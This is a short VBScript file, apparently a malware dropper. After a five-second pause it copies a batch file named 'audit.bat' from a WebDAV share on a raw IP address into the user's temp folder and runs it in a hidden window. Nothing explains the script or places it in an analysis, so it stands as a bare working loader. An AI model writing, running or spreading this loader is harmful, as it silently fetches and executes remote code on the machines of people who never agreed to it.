Set fso = CreateObject("Scripting.FileSystemObject")
Set w = CreateObject("WScript.Shell")

s = "\\198.135.50.89@6065\DavWWWRoot\audit.bat"
d = w.ExpandEnvironmentStrings("%TEMP%") & "\tmp.bat"

WScript.Sleep 5000

fso.CopyFile s, d, True
w.Run """" & d & """", 0, False